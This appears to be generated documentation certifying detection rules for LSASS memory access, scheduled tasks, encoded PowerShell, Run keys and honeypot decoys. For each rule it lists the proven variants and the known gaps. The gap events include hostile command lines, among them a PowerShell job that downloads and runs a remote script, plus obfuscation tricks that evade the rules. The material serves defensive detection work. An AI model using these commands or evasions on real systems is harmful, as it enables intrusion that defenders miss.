# Behaviour certificates

Each detection with a behaviour spec (`behavior.yml` beside its rule) lists the ways its technique appears in the events the rule reads, as variants built from documented behaviour, each with its sources. certify decides every variant over every possible value of every field ([how](CERTIFY.md#behaviour-proofs)):

- **proven**: every event of the variant gets the expected verdict. The search behind it covers every reachable state, so this is a proof, not a sample.
- **known gap**: an event of the variant slips past the rule. The event is shown, replayed through the engine, and checked against the variant's own patterns with Python's `re` and the reference argument parser. It stays listed until the rule changes.
- **stays quiet**: a design exclusion, proven to keep the rule quiet on every event it covers.

CI fails when a gap appears that the spec does not list, when a listed gap closes (the spec must then say `fires`), and when an exclusion fires.

**81 variants over 16 detections: 37 proven for every event, 18 known gaps, 26 exclusions proven quiet.**

## T1003.001 Suspicious Process Access to LSASS Memory

**Behaviour.** A process opens lsass.exe with an access mask that includes PROCESS_VM_READ (0x10), the right needed to read its memory, whatever other rights the mask holds.

[`T1003.001_lsass_memory_access`](../detect/detections/T1003.001_lsass_memory_access/) · [spec](../detect/detections/T1003.001_lsass_memory_access/behavior.yml) · [rule](../detect/detections/T1003.001_lsass_memory_access/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Memory read access, hexadecimal as Sysmon writes it | fires | **proven** for every event |
| A copy of an excluded Windows component elsewhere | fires | **proven** for every event |
| PowerShell or the WinRM host reading lsass memory | fires | **proven** for every event |
| Memory read access written in decimal | known gap | slips past (event below) |
| MsMpEng.exe directly in the Platform folder | known gap | slips past (event below) |
| Windows components named in the exclusion | stays quiet | **proven** for every event |
| Defender's engine from its platform folder | stays quiet | **proven** for every event |
| PowerShell or the WinRM host listing processes | stays quiet | **proven** for every event |

Events found, each replayed through the engine and checked against its variant:

*Memory read access written in decimal*

```text
GrantedAccess: 1040
SourceImage:   C:\Users\Public\dump.exe
TargetImage:   C:\Windows\system32\lsass.exe
```

*MsMpEng.exe directly in the Platform folder*

```text
GrantedAccess: 0x1010
SourceImage:   C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe
TargetImage:   C:\Windows\system32\lsass.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Memory read access, hexadecimal as Sysmon writes it.** Any mask with PROCESS_VM_READ [[access-rights](https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights)], which MiniDumpWriteDump and the dumping tools ask for [[minidump](https://learn.microsoft.com/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump), [splunk-lsass](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)], in hexadecimal with the 0x prefix, any letter case, leading zeros allowed, from any process outside the three exclusions below (paths as Windows reports them, without empty segments). *Exact sizes:* 2,147,483,648 access masks that include PROCESS_VM_READ (32-bit, written 0x with lowercase digits).
- **A copy of an excluded Windows component elsewhere.** The exclusions name full paths, so a csrss.exe, wininit.exe or WmiPrvSE.exe outside its Windows folder is any other process [[access-rights](https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights)].
- **PowerShell or the WinRM host reading lsass memory.** The process-listing exclusion needs the mask 0x1410 (or 5136) and System.ni.dll on the call stack; any other read from these two processes, such as a dumping tool loaded into PowerShell, is not a process listing [[access-rights](https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights), [splunk-lsass](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)].
- **Memory read access written in decimal.** A pipeline that turns the mask into a number writes it in decimal; 1040 is 0x410, PROCESS_QUERY_INFORMATION with PROCESS_VM_READ, exactly what MiniDumpWriteDump asks for [[minidump](https://learn.microsoft.com/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump), [access-rights](https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights)]. *Exact sizes:* 2,147,483,648 access masks that include PROCESS_VM_READ, in decimal. *Gap:* The decimal branch lists eight masks seen from dumping tools; every other decimal mask that grants PROCESS_VM_READ passes. *Fix:* Normalize GrantedAccess to hexadecimal in the pipeline, or test the bit in decimal: a mask grants PROCESS_VM_READ exactly when its value modulo 32 is between 16 and 31.
- **MsMpEng.exe directly in the Platform folder.** Defender keeps its engine in a version folder under Platform; a file of the same name placed in the Platform folder itself is not Defender's engine [[access-rights](https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights)]. *Gap:* filter_defender asks only for the Platform folder at the start and \MsMpEng.exe at the end, and the backslash between them serves both, so MsMpEng.exe in Platform\ itself is excluded too. Writing there needs administrator rights and Defender's tamper protection off. *Fix:* Require a version folder, as SourceImage|re ^C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\[^\\]+\\MsMpEng\.exe$ (case-insensitive).
- **Windows components named in the exclusion.** csrss.exe, wininit.exe and WMI's WmiPrvSE.exe read lsass memory in normal operation. *Why quiet:* filter_os_components excludes exactly these four paths, in any letter case.
- **Defender's engine from its platform folder.** Microsoft Defender's MsMpEng.exe scans lsass from its versioned folder under the Platform directory. *Why quiet:* filter_defender excludes MsMpEng.exe only under C:\ProgramData\Microsoft\Windows Defender\Platform\.
- **PowerShell or the WinRM host listing processes.** Get-Process in Windows PowerShell or a remote session opens every process with 0x1410 through System.ni.dll. *Why quiet:* filter_process_listing excludes that mask from these two processes when System.ni.dll is on the call stack.

</details>

Sources:

- [access-rights](https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights): Microsoft Learn, Process Security and Access Rights (PROCESS_VM_READ is 0x0010, required to read a process's memory)
- [minidump](https://learn.microsoft.com/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump): Microsoft Learn, MiniDumpWriteDump (the handle needs PROCESS_QUERY_INFORMATION and PROCESS_VM_READ)
- [splunk-lsass](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html): Splunk Threat Research, You Bet Your Lsass (the masks dumping tools ask for, as Sysmon writes them, 0x1010, 0x1410, 0x1fffff)

## T1046 Deception - Interaction With a Decoy Network Service

**Behaviour.** A client on the network probes or connects to one of the decoy services, or tries to log on to one of them. OpenCanary writes one JSON record per interaction with the module's event code (logtype), the decoy's identity (node_id) and the client (src_host). Nothing legitimate talks to the decoy, so any record from a client other than the authorised scanner and the decoy itself is the signal.

[`T1046_decoy_service_interaction`](../detect/detections/T1046_decoy_service_interaction/) · [spec](../detect/detections/T1046_decoy_service_interaction/behavior.yml) · [rule](../detect/detections/T1046_decoy_service_interaction/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Connection to a decoy service | fires | **proven** for every event |
| Login attempt on a decoy service | fires | **proven** for every event |
| Port scan of the decoy | fires | **proven** for every event |
| The decoy's own records | stays quiet | **proven** for every event |
| Modules the inventory does not enable, and the LLMNR responder | stays quiet | **proven** for every event |
| The authorised scanner and the decoy itself | stays quiet | **proven** for every event |
| Another canary | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Connection to a decoy service.** The FTP, web, SSH, SMB, Telnet, VNC and RDP modules log a record when a client connects, fetches the login page or opens a file on the share [[opencanary-logger](https://github.com/thinkst/opencanary/blob/main/opencanary/logger.py)] [[opencanary-docs](https://opencanary.readthedocs.io/en/latest/)]; reaching a service nobody advertised is network service discovery [[attack-network-service-discovery](https://attack.mitre.org/techniques/T1046/)].
- **Login attempt on a decoy service.** The FTP, web, SSH, Telnet and MSSQL modules log every credential presented to them [[opencanary-logger](https://github.com/thinkst/opencanary/blob/main/opencanary/logger.py)] [[opencanary-docs](https://opencanary.readthedocs.io/en/latest/)].
- **Port scan of the decoy.** The port scan module reads the kernel's log of SYN packets and Nmap probes to closed ports, and writes the ports as strings [[opencanary-logger](https://github.com/thinkst/opencanary/blob/main/opencanary/logger.py)].
- **The decoy's own records.** Start-up, messages, debug, errors, the heartbeat, configuration saves and the example module write records with codes 1000 to 1006 and no client [[opencanary-logger](https://github.com/thinkst/opencanary/blob/main/opencanary/logger.py)]. *Why quiet:* Only the interaction codes of the enabled modules are selected.
- **Modules the inventory does not enable, and the LLMNR responder.** Records of modules that are not enabled on this decoy cannot be produced by it; the LLMNR responder's records (19001) are name resolution chatter from Windows hosts, not an interaction with a service [[opencanary-logger](https://github.com/thinkst/opencanary/blob/main/opencanary/logger.py)]. *Why quiet:* The rule lists the codes of the enabled modules; rasd deceive --check keeps the list and the inventory in step.
- **The authorised scanner and the decoy itself.** The lab's vulnerability scanner probes every host on its schedule, and the decoy's health check connects to its own services over loopback. *Why quiet:* filter_authorised_scanner and filter_loopback, each recorded in tuning.yml.
- **Another canary.** A test canary that is not in the inventory writes the same records under its own node_id; the inventory decides which decoys alert. *Why quiet:* node_id must be the inventory's decoy.

</details>

Sources:

- [opencanary-logger](https://github.com/thinkst/opencanary/blob/main/opencanary/logger.py): thinkst/opencanary, opencanary/logger.py (the LOG_* event codes; sanitizeLog writes node_id, src_host, dst_port and logtype into every record)
- [opencanary-docs](https://opencanary.readthedocs.io/en/latest/): OpenCanary documentation (modules and their alerts)
- [attack-network-service-discovery](https://attack.mitre.org/techniques/T1046/): MITRE ATT&CK, T1046 Network Service Discovery

## T1053.005 Scheduled Task Registered via PowerShell ScheduledTasks Cmdlets

**Behaviour.** powershell.exe or pwsh.exe registers or changes a scheduled task from its command line: the ScheduledTasks cmdlets, the PSScheduledJob cmdlets, or the Task Scheduler COM object.

[`T1053.005_powershell_scheduled_task_creation`](../detect/detections/T1053.005_powershell_scheduled_task_creation/) · [spec](../detect/detections/T1053.005_powershell_scheduled_task_creation/behavior.yml) · [rule](../detect/detections/T1053.005_powershell_scheduled_task_creation/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Task registered with an inline action | fires | **proven** for every event |
| Module-qualified cmdlet names | fires | **proven** for every event |
| Environment variable in braces | known gap | slips past (event below) |
| Register-ScheduledJob | known gap | slips past (event below) |
| Task Scheduler COM object | known gap | slips past (event below) |
| Quoted part inside the cmdlet name | known gap | slips past (event below) |

Events found, each replayed through the engine and checked against its variant:

*Environment variable in braces*

```text
CommandLine: powershell.exe -c "Register-ScheduledTask -TaskName Updater -Xml (Get-Content ${env:TEMP}\u.xml -Raw)"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Register-ScheduledJob*

```text
CommandLine: powershell.exe -c "Register-ScheduledJob -Name Updater -ScriptBlock { IEX (iwr http://10.0.0.5/a.ps1) } -Trigger (New-JobTrigger -AtLogOn)"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Task Scheduler COM object*

```text
CommandLine: powershell.exe -c "$s=New-Object -ComObject Schedule.Service;$s.Connect();$t=$s.NewTask(0);$a=$t.Actions.Create(0);$a.Path='C:\Users\Public\u.exe';$s.GetFolder('\').RegisterTaskDefinition('Updater',$t,6,$null,$null,3)"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Quoted part inside the cmdlet name*

```text
CommandLine: powershell.exe -c Register-Sched"uled"Task -TaskName u -Action (New-ScheduledTaskAction -Execute calc.exe)
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Task registered with an inline action.** The documented way to build and register a task in one command: New-ScheduledTaskAction for the action [[new-scheduledtaskaction](https://learn.microsoft.com/powershell/module/scheduledtasks/new-scheduledtaskaction)], Register-ScheduledTask or Set-ScheduledTask to store it [[register-scheduledtask](https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask)], in any letter case and order.
- **Module-qualified cmdlet names.** A command can be called by its module-qualified name [[command-precedence](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_command_precedence)], as ScheduledTasks\Register-ScheduledTask.
- **Environment variable in braces.** ${env:TEMP} is the same variable as $env:TEMP: a variable name can always be written in braces [[about-variables](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_variables)]. Here the task comes from XML (Register-ScheduledTask -Xml), so no New-ScheduledTaskAction appears [[register-scheduledtask](https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask)]. *Gap:* The rule looks for the text $env:TEMP and $env:APPDATA, which the brace form does not contain. *Fix:* Match the variable names with an optional brace, as \$\{?env:(TEMP|APPDATA).
- **Register-ScheduledJob.** Windows PowerShell's Register-ScheduledJob registers a job in Task Scheduler, under Microsoft\Windows\PowerShell\ScheduledJobs [[register-scheduledjob](https://learn.microsoft.com/powershell/module/psscheduledjob/register-scheduledjob?view=powershell-5.1)]. *Gap:* The rule knows only the ScheduledTasks cmdlets. *Fix:* Add Register-ScheduledJob to selection_register, for powershell.exe.
- **Task Scheduler COM object.** The TaskService object (ProgID Schedule.Service) registers a task with RegisterTaskDefinition [[taskservice](https://learn.microsoft.com/windows/win32/taskschd/taskservice), [com-registration](https://learn.microsoft.com/windows/win32/taskschd/registration-trigger-example--scripting-)], from any language that can create COM objects. *Gap:* The rule knows only the ScheduledTasks cmdlets. *Fix:* Add Schedule.Service with RegisterTaskDefinition on the same command line.
- **Quoted part inside the cmdlet name.** PowerShell reads its command from the arguments after the C runtime has split them and dropped the quotes [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)], so Register-Sched"uled"Task on the command line runs Register-ScheduledTask; such quotes change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule looks for the cmdlet names as unbroken text in the raw command line. *Fix:* Remove the quotes from the command line before matching (a normalized field).

</details>

Sources:

- [register-scheduledtask](https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask): Microsoft Learn, Register-ScheduledTask (ScheduledTasks module)
- [new-scheduledtaskaction](https://learn.microsoft.com/powershell/module/scheduledtasks/new-scheduledtaskaction): Microsoft Learn, New-ScheduledTaskAction (ScheduledTasks module)
- [command-precedence](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_command_precedence): Microsoft Learn, about_Command_Precedence (module-qualified command names)
- [about-variables](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_variables): Microsoft Learn, about_Variables (a variable name in braces, as in ${env:ProgramFiles(x86)})
- [register-scheduledjob](https://learn.microsoft.com/powershell/module/psscheduledjob/register-scheduledjob?view=powershell-5.1): Microsoft Learn, Register-ScheduledJob (scheduled jobs are registered in Task Scheduler under Microsoft\Windows\PowerShell\ScheduledJobs)
- [taskservice](https://learn.microsoft.com/windows/win32/taskschd/taskservice): Microsoft Learn, TaskService object (ProgID Schedule.Service)
- [com-registration](https://learn.microsoft.com/windows/win32/taskschd/registration-trigger-example--scripting-): Microsoft Learn, Registration Trigger Example (Scripting) - CreateObject("Schedule.Service") ... RegisterTaskDefinition
- [crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments): Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
- [dosfuscation](https://www.exploit-db.com/docs/44347): D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line

## T1059.001 PowerShell Execution With Encoded Command

**Behaviour.** powershell.exe or pwsh.exe is started with -EncodedCommand (any spelling the console host accepts) followed by Base64 text that Convert.FromBase64String decodes.

[`T1059.001_powershell_encoded_command`](../detect/detections/T1059.001_powershell_encoded_command/) · [spec](../detect/detections/T1059.001_powershell_encoded_command/behavior.yml) · [rule](../detect/detections/T1059.001_powershell_encoded_command/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Documented spellings, plain arguments | fires | **proven** for every event |
| Whole arguments in quotes | fires | **proven** for every event |
| Quoted parts inside an argument | known gap | slips past (event below) |
| White space inside the Base64 text | known gap | slips past (event below) |
| Base64 text shorter than 16 characters | known gap | slips past (event below) |
| Blanks around the switch inside its quotes (pwsh) | known gap | slips past (event below) |
| SCCM client as the parent | stays quiet | **proven** for every event |

Events found, each replayed through the engine and checked against its variant:

*Quoted parts inside an argument*

```text
CommandLine: powershell.exe -NoP -W Hidden -e"n"c VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAdQByAHAAbABlACcA
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*White space inside the Base64 text*

```text
CommandLine: powershell.exe -NoP -W Hidden -enc "VwByAGkA dABlAC0A TwB1AHQA cAB1AHQA IAAnAHAA dQByAHAA bABlACcA"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Base64 text shorter than 16 characters*

```text
CommandLine: powershell.exe -enc YwBhAGwAYwA=
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Blanks around the switch inside its quotes (pwsh)*

```text
CommandLine: pwsh.exe -NoProfile "-enc " VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAdQByAHAAbABlACcA
Image:       C:\Program Files\PowerShell\7\pwsh.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Documented spellings, plain arguments.** Every switch character and abbreviation the console host accepts [[pwsh-parser](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/Microsoft.PowerShell.ConsoleHost/host/msh/CommandLineParameterParser.cs), [pwsh-dash](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/engine/parser/CharTraits.cs), [harness](https://www.powershellgallery.com/packages/AtomicTestHarnesses/1.7.0.0/Content/TestHarnesses/T1059.001_PowerShell/OutPowerShellCommandLineParameter.ps1)], any letter case, any arguments around it, no quotes on the command line.
- **Whole arguments in quotes.** Each argument either plain or wrapped whole in double quotes, as scripts and launchers write them [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)].
- **Quoted parts inside an argument.** The C runtime lets a quoted part sit anywhere inside an argument and drops the quotes, so -e"n"c reaches PowerShell as -enc [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]; the quotes stay in the logged command line and change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule allows quotes only around the switch name and before the Base64 text, so a quote inside the name or inside the Base64 text breaks the match. *Fix:* Remove the quotes from the command line before matching (a normalized field), or allow a quote between every character of the switch and the Base64 run.
- **White space inside the Base64 text.** PowerShell decodes the text with Convert.FromBase64String [[pwsh-base64](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/utils/PsUtils.cs)], which ignores tabs, line feeds, carriage returns and spaces anywhere in it [[frombase64](https://learn.microsoft.com/dotnet/api/system.convert.frombase64string)]; spaces and tabs need quotes on the command line, line feeds and carriage returns do not [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]. *Gap:* The rule needs 16 Base64 characters in one unbroken run. *Fix:* Allow white space between the Base64 characters, or count them across white space.
- **Base64 text shorter than 16 characters.** An encoded command of one to five characters of script, such as calc, is 4 to 12 Base64 characters [[frombase64](https://learn.microsoft.com/dotnet/api/system.convert.frombase64string)]. *Gap:* The rule asks for at least 16 Base64 characters (six characters of script), so a script of five characters or fewer passes. *Fix:* Lower the floor to 4 Base64 characters (one character of script) after the -EncodedCommand spellings.
- **Blanks around the switch inside its quotes (pwsh).** pwsh trims each argument before reading it as a switch [[pwsh-parser](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/Microsoft.PowerShell.ConsoleHost/host/msh/CommandLineParameterParser.cs)], so "-enc " with a blank inside the quotes is still -EncodedCommand; the quotes keep the blank in the argument [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]. *Gap:* The rule wants the Base64 text right after the blanks that follow the switch, but here a quote closes the argument and a second blank run starts the next one. *Fix:* Allow a closing quote and further blanks between the switch and the Base64 text.
- **SCCM client as the parent.** The configuration manager client starts encoded PowerShell as part of normal management. *Why quiet:* filter_sccm excludes exactly C:\Windows\CCM\CcmExec.exe as the parent (in any case); a copy of CcmExec.exe in any other folder still alerts.

</details>

Sources:

- [pwsh-parser](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/Microsoft.PowerShell.ConsoleHost/host/msh/CommandLineParameterParser.cs): PowerShell 7 console host, CommandLineParameterParser.cs (GetSwitchKey, MatchSwitch, -EncodedCommand)
- [pwsh-dash](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/engine/parser/CharTraits.cs): PowerShell 7, CharTraits.cs (IsDash - the four dash characters)
- [pwsh-base64](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/utils/PsUtils.cs): PowerShell 7, PsUtils.cs (StringToBase64Converter.Base64ToString calls Convert.FromBase64String)
- [frombase64](https://learn.microsoft.com/dotnet/api/system.convert.frombase64string): .NET Convert.FromBase64String (tab, line feed, carriage return and space are ignored anywhere; up to two trailing '=')
- [harness](https://www.powershellgallery.com/packages/AtomicTestHarnesses/1.7.0.0/Content/TestHarnesses/T1059.001_PowerShell/OutPowerShellCommandLineParameter.ps1): Red Canary AtomicTestHarnesses, Out-PowerShellCommandLineParameter (powershell.exe switch characters and EncodedCommand abbreviations)
- [crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments): Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
- [dosfuscation](https://www.exploit-db.com/docs/44347): D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line

## T1078.002 Deception - Authentication Attempt With a Honey Account

**Behaviour.** Someone presents a decoy domain account to Windows authentication: a logon attempt that succeeds or fails (4624, 4625), a Kerberos ticket-granting ticket request or pre-authentication failure (4768, 4771), or an NTLM credential validation (4776). Nobody is supposed to use these accounts, so the outcome, the logon type and the source do not matter: any such event is the signal.

[`T1078.002_honey_account_authentication`](../detect/detections/T1078.002_honey_account_authentication/) · [spec](../detect/detections/T1078.002_honey_account_authentication/behavior.yml) · [rule](../detect/detections/T1078.002_honey_account_authentication/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Logon failure with a decoy account | fires | **proven** for every event |
| Logon success with a decoy account | fires | **proven** for every event |
| Kerberos ticket-granting ticket requested for a decoy account | fires | **proven** for every event |
| Kerberos pre-authentication failure for a decoy account | fires | **proven** for every event |
| NTLM credential validation of a decoy account | fires | **proven** for every event |
| Decoy account written as a user principal name | fires | **proven** for every event |
| Authentication of any other account | stays quiet | **proven** for every event |
| Events about a decoy that are not an authentication | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Logon failure with a decoy account.** A wrong or guessed password for the decoy is refused by a domain controller or a member server, which writes the account as typed in Account Name [[event-4625](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4625)]; the lure (the credentials file the description points at) was read and its password tried [[attack-domain-accounts](https://attack.mitre.org/techniques/T1078/002/)].
- **Logon success with a decoy account.** A logon of any type was granted with the decoy, so its real password was obtained [[event-4624](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624)]; the lures hold wrong ones.
- **Kerberos ticket-granting ticket requested for a decoy account.** An AS-REQ for the decoy, whatever the result: a TGT issued after a right password, a request refused with 0x18, or a TGT issued without pre-authentication (Pre-Authentication Type 0), which is what AS-REP roasting collects from an account whose pre-authentication is disabled [[event-4768](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4768)].
- **Kerberos pre-authentication failure for a decoy account.** A wrong password presented over Kerberos fails pre-authentication on the domain controller [[event-4771](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4771)].
- **NTLM credential validation of a decoy account.** NTLM authentication with the decoy is validated by a domain controller, which logs the account and the workstation [[event-4776](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4776)].
- **Decoy account written as a user principal name.** Logon prompts accept user@realm, and 4625 records the name as it was typed [[event-4625](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4625)]; any realm or suffix may follow the @.
- **Authentication of any other account.** The decoys are the only accounts the rule names; every other account, including names that merely start or end like a decoy's, is ordinary traffic. *Why quiet:* TargetUserName must equal a decoy name, or a decoy name followed by @ and a realm.
- **Events about a decoy that are not an authentication.** A logoff, an explicit-credential logon record, a privilege assignment, an account change or lockout, and a service ticket (the honey SPN rule's event) name the account without presenting its credential. *Why quiet:* Only the five authentication events are selected.

</details>

Sources:

- [event-4624](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624): Microsoft Learn, 4624(S) An account was successfully logged on (Target Account: Account Name)
- [event-4625](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4625): Microsoft Learn, 4625(F) An account failed to log on (Account For Which Logon Failed: Account Name, as typed, sAMAccountName or UPN)
- [event-4768](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4768): Microsoft Learn, 4768(S, F) A Kerberos authentication ticket (TGT) was requested (Account Name; Pre-Authentication Type 0 when none was used)
- [event-4771](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4771): Microsoft Learn, 4771(F) Kerberos pre-authentication failed (Account Name; Failure Code 0x18 = wrong password)
- [event-4776](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4776): Microsoft Learn, 4776(S, F) The computer attempted to validate the credentials for an account (Logon Account)
- [attack-domain-accounts](https://attack.mitre.org/techniques/T1078/002/): MITRE ATT&CK, T1078.002 Valid Accounts, Domain Accounts

## T1547.001 Run Key Persistence Pointing to Suspicious Location

**Behaviour.** A value is written under a Run or RunOnce key (Sysmon event 13) whose data starts a script interpreter, or points into a user-writable folder, or drops a binary straight into a user profile; the two signed-vendor autostarts the rule knows are left alone.

[`T1547.001_registry_run_key_persistence`](../detect/detections/T1547.001_registry_run_key_persistence/) · [spec](../detect/detections/T1547.001_registry_run_key_persistence/behavior.yml) · [rule](../detect/detections/T1547.001_registry_run_key_persistence/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| A Run key launching a script interpreter | fires | **proven** for every event |
| A binary dropped straight into a user profile | fires | **proven** for every event |
| OneDrive's own autostart | stays quiet | **proven** for every event |
| Microsoft Teams' Squirrel updater | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **A Run key launching a script interpreter.** Logon persistence most often runs an interpreter from the Run key, which the rule lists by name (PowerShell, pwsh, mshta, wscript, cscript, rundll32, regsvr32, cmd /c) [[run-keys](https://learn.microsoft.com/en-us/windows/desktop/SetupApi/run-and-runonce-registry-keys), [mitre](https://attack.mitre.org/techniques/T1547/001/)]. The two signed-vendor exclusions are excluded here, because their filters read the whole value and a crafted user name could otherwise place "powershell" inside an OneDrive-shaped path.
- **A binary dropped straight into a user profile.** A value whose data is an executable or script placed directly in a profile folder (C:\Users\<name>\<file>.exe) is caught by the profile-root branch [[mitre](https://attack.mitre.org/techniques/T1547/001/)]; the vendor exclusions sit deeper under AppData\Local\Microsoft, so a profile-root drop is never one of them.
- **OneDrive's own autostart.** OneDrive registers its signed client under the Run key at every sign-in; this is normal. *Why quiet:* filter_onedrive excludes exactly OneDrive.exe under the user's AppData\Local\Microsoft\OneDrive folder, with nothing appended but an optional /background.
- **Microsoft Teams' Squirrel updater.** The Teams machine-wide installer registers Squirrel's Update.exe to start Teams at logon. *Why quiet:* filter_teams excludes exactly Update.exe under AppData\Local\Microsoft\Teams starting Teams.exe; any other binary under that folder still alerts.

</details>

Sources:

- [run-keys](https://learn.microsoft.com/en-us/windows/desktop/SetupApi/run-and-runonce-registry-keys): Microsoft Learn, Run and RunOnce Registry Keys (HKLM/HKCU ...\CurrentVersion\Run and RunOnce start a program at logon)
- [mitre](https://attack.mitre.org/techniques/T1547/001/): MITRE ATT&CK, T1547.001 Boot or Logon Autostart Execution - Registry Run Keys / Startup Folder
- [sysmon13](https://isc.sans.edu/diary/28558): SANS ISC, Sysmon's RegistryEvent (Value Set) - event 13 carries TargetObject (the value) and Details (its data)

## T1552.001 Deception - Honey Credentials File Opened

**Behaviour.** A user account reads, writes, appends to or deletes one of the decoy credential files, on the server that holds it, through any process. The file's SACL makes Windows write event 4663 with the access that was exercised; the decoy files exist only to be found, so the access itself is the signal.

[`T1552.001_honey_file_access`](../detect/detections/T1552.001_honey_file_access/) · [spec](../detect/detections/T1552.001_honey_file_access/behavior.yml) · [rule](../detect/detections/T1552.001_honey_file_access/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Data access to a decoy file by a user account | fires | **proven** for every event |
| Attribute reads of a decoy | stays quiet | **proven** for every event |
| Every other file | stays quiet | **proven** for every event |
| The server's own machine account and the search indexer | stays quiet | **proven** for every event |
| The search indexer reading a decoy | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Data access to a decoy file by a user account.** Opening the file to read it (ReadData, %%4416), writing or appending to it (%%4417, %%4418) or deleting it (%%1537) exercises an access the decoy's SACL audits, and 4663 records the object's local path, the type File and the %%-coded accesses [[event-4663](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4663)] [[audit-file-system](https://learn.microsoft.com/windows/security/threat-protection/auditing/audit-file-system)]. Searching shares for files that hold passwords is the documented behaviour [[attack-credentials-in-files](https://attack.mitre.org/techniques/T1552/001/)].
- **Attribute reads of a decoy.** Listing a folder reads each file's attributes (ReadAttributes, %%4423) and, for a handle that only reads security or synchronises, no data; Explorer does this for every file it shows [[event-4663](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4663)]. *Why quiet:* AccessList must contain one of the four data accesses.
- **Every other file.** The SACL and the rule name three files; the real documents beside them, and names that merely contain a decoy's name, are ordinary traffic. *Why quiet:* ObjectName must end with one of the three decoy paths.
